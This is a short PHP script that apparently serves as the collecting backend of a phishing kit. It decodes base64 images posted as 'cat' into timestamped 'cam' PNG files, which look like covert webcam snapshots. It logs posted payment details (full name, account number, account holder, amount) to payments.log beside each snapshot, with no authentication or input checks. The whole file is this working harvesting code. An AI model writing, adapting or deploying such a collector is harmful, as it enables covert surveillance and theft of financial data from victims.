<?php
$date = date('dMYHis');

if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
    $filteredData = substr($_POST['cat'], strpos($_POST['cat'], ",") + 1);
    $unencodedData = base64_decode($filteredData);
    if ($unencodedData) {
        $fp = fopen('cam' . $date . '.png', 'wb');
        fwrite($fp, $unencodedData);
        fclose($fp);
    }
}

if (!empty($_POST['paymentData'])) {
    $paymentData = json_decode($_POST['paymentData'], true);
    $logEntry = "=== Payment " . $date . " ===\n";
    $logEntry .= "Type: " . ($paymentData['transactionType'] ?? 'N/A') . "\n";
    $logEntry .= "Service: " . ($paymentData['service'] ?? 'N/A') . "\n";
    $logEntry .= "Name: " . ($paymentData['fullName'] ?? 'N/A') . "\n";
    $logEntry .= "Account: " . ($paymentData['accountNumber'] ?? 'N/A') . "\n";
    $logEntry .= "Holder: " . ($paymentData['accountHolder'] ?? 'N/A') . "\n";
    $logEntry .= "Amount: " . ($paymentData['amount'] ?? 'N/A') . "\n";
    $logEntry .= "Description: " . ($paymentData['description'] ?? 'N/A') . "\n";
    $logEntry .= "Snap File: cam" . $date . ".png\n";
    $logEntry .= "==========================\n\n";
    
    file_put_contents('payments.log', $logEntry, FILE_APPEND);
}

echo json_encode(['status' => 'success', 'date' => $date]);
exit();
?>